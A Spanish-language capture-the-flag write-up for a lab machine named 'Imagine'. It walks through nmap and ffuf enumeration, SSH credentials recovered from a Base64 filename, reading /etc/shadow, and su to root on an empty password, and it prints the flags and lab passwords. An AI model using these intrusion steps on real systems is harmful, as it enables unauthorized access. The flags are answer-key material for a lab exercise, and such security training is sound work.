# Kill Chain — Imagine

## Resumen

| Fase | Acción | Resultado |
|------|--------|-----------|
| Reconocimiento | nmap -sV -p- | Apache 80, SSH 2222 |
| Enumeración web | ffuf + extensiones .html .php .txt | 5 ficheros con información sensible |
| Obtención de credenciales | Decodificación Base64 del nombre de fichero | Password SSH de jude |
| Acceso inicial | SSH como jude | Shell de usuario |
| Escalada | su root sin contraseña (shadow: `*`) | Shell de root |

---

## Detalle por fase

### 1. Reconocimiento

```
nmap -sV -sC -p- 172.17.0.2
```

- Puerto 80: Apache httpd 2.4.62 (Alpine)
- Puerto 2222: OpenSSH 9.3

### 2. Enumeración web

```
ffuf -u http://172.17.0.2/FUZZ -e .php,.html,.txt -mc 200 -fs 45
```

Hallazgos:
- `creditcard.html` → usernames: jude, lenny, admin
- `Z290b3Bhc3M=.html` → password SSH (Base64 decode del nombre = "gotopass")
- `xcart.tgz` → pista credencial adicional: `MS$_12j:-=9`

### 3. Acceso inicial

```
ssh jude@172.17.0.2 -p 2222
cat /home/jude/.flag.txt
→ FLAG 1: 88ac53e0479687e3724a3be8564d2816
```

### 4. Escalada de privilegios

```
cat /etc/shadow | grep root
→ root:*::0:::::    ← hash '*' = sin contraseña en busybox/Alpine

su root             ← sin contraseña
id
→ uid=0(root)
→ FLAG 2: root shell obtenida
```

---

## Diagrama

```
[Atacante]
    │
    ▼ HTTP :80
[Apache] ──► creditcard.html ──► usuarios: jude, lenny, admin
         ──► Z290b3Bhc3M=.html ──► password de jude (Base64 en el nombre)
         ──► xcart.tgz ──► pista: MS$_12j:-=9
    │
    ▼ SSH :2222 (usuario: jude)
[Shell jude]
    │
    ▼ cat /etc/shadow → root:* → sin contraseña
    ▼ su root (sin contraseña)
[Shell ROOT] ◄── comprometido
```

---

## CVE / CWE aplicables

| Referencia | Descripción |
|-----------|-------------|
| CWE-258 | Empty Password in Configuration File |
| CWE-200 | Exposure of Sensitive Information to Unauthorized Actor |
| OWASP A02:2021 | Cryptographic Failures (credenciales en texto plano/ofuscado) |
| OWASP A05:2021 | Security Misconfiguration (ficheros sensibles accesibles) |
